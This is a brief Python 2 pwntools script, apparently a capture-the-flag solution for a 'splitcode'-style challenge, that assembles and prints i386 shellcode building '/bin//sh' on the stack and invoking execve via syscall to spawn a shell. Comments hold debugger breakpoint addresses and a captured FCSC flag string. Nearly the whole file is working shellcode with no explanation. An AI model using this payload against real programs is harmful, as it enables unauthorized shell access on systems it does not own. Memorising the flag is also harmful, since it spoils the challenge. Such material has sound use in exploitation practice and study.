#!/usr/bin/env python2

# https://ctf.harrisongreen.me/2019/hxpctf/splitcode/

from pwn import *
import string

shl = '''
    xor ecx, ecx
    xor ebx, ebx
    xor esi, esi
    push 0x0
    mov ch, 'h'
    mov cl, 's'
    push cx
    mov ch, '/'
    mov cl, '/'
    push cx
    mov bh, 'n'
    mov bl, 'i'
    push bx
    mov ch, 'b'
    push cx
    push esp
    pop edi
    mov al, 0x3b
    xor edx, edx
    xor esi, esi
    syscall
'''

shl = asm(shl, arch='i386')

print shl

'''
call rdx = b *main+593
start loop = b *main+413
syscall = tb *0x555555559338

shl:
0x5555555592a0
'''

# FCSC{3d3aaf328341c207016b20afd005a60a6311e5238380b1fa0d697f3a544ca283}
